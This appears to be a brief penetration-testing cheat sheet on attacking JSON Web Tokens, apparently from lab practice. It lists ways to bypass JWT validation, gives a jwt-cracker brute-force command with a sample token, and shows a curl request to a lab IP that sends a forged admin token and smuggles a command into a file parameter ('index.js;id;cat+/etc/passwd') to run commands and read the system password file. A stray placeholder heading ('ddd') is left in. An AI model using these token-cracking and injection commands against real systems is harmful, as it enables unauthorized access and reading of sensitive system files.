# JWT Tokens

The three main ways to bypass JWT validation:

* Using the `none` alg
* Hijacking another user
* Brute forcing the key.

### Decode the JWT token

{% embed url="https://jwt.io" %}

### Crack JWT tokens

{% embed url="https://lmammino.github.io/jwt-cracker" %}

* ```
  jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
  ```
* #### ddd

### Local file inclusion

```
curl -i \
  -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWUzNGRkOWJmNTYxMjA0NjIyMGQxYzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imxlb25AbGVvbi5jb20iLCJpYXQiOjE2NDIyODcxMDJ9.5MlYl8Eubb0sci3Jt3cuacNSki36aGeUoHNrMWXeBXE' \
  'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' | sed 's/\\n/\n/g'
```
